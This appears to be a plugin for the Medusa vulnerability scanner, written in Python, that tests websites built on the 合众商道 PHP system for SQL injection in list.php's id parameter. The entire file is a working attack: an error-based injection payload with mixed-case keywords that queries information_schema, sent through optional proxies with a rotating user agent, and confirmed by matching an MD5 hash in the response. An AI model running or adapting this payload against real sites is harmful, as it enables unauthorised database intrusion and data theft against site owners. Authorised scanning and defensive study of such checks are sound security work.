#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 合众商道php系统通用注入
referer: http://www.wooyun.org/bugs/wooyun-2010-083434
author: Lucifer
description: inurl:list.php文件id参数存在SQL注入。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/list.php?id=2%20AnD%20(SeLeCt%201%20FrOm(SeLeCt%20CoUnT(*),CoNcAt(0x5c,(MiD((IfNuLl(CaSt(Md5(1234)%20As%20ChAr),0x20)),1,50)),0x5c,FlOoR(RaNd(0)*2))x%20FrOm%20InFoRmAtIoN_ScHeMa.ChArAcTeR_SeTs%20GrOuP%20By%20x)a)"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
            Medusa = "{} 存在合众商道php系统通用注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass